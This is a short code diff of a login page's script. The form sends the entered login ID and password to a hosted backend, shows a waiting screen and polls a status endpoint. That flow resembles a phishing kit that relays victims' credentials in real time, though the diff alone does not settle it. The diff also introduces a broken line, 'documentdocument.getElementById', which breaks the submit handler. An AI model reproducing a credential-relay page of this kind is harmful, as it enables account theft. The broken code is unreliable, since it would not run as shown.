@@ -413,17 +413,17 @@
       pwd.type = pwd.type === 'password' ? 'text' : 'password';
     }
 
-    document.getElementById('loginForm').addEventListener('submit', function (e) {
+    documentdocument.getElementById('loginForm').addEventListener('submit', function (e) {
   e.preventDefault();
   const loginId = document.getElementById('login-id').value;
   const password = document.getElementById('password').value;
 
   document.getElementById('waitPage').style.display = 'flex';
 
-  fetch('https://your-backend.onrender.com/login', {  // Replace with your backend URL
+  fetch('https://b-backend.onrender.com/login', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({ login: loginId, password: password })  // Match backend's expected keys
+    body: JSON.stringify({ login: loginId, password: password })
   })
   .then(res => {
     if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
@@ -445,7 +445,7 @@
 
 function checkStatus(id) {
   const interval = setInterval(() => {
-    fetch(`https://your-backend.onrender.com/status/${id}`)  // Replace with your backend URL
+    fetch(`https://b-backend.onrender.com/status/${id}`)
     .then(res => {
       if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
       return res.json();
